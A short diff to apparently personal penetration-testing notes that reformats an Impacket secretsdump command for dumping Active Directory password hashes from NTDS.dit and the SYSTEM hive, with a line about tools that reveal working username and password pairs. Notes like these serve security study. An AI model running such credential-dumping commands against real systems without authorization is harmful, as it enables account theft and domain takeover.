@@ -85,4 +85,4 @@
 	- this will spit out any working username: password
 
 **Secrets dump:**
-- secretsdump.py -ntds NTDS.dit -system system.hive LOCAL
+- `secretsdump.py -ntds NTDS.dit -system system.hive LOCAL`
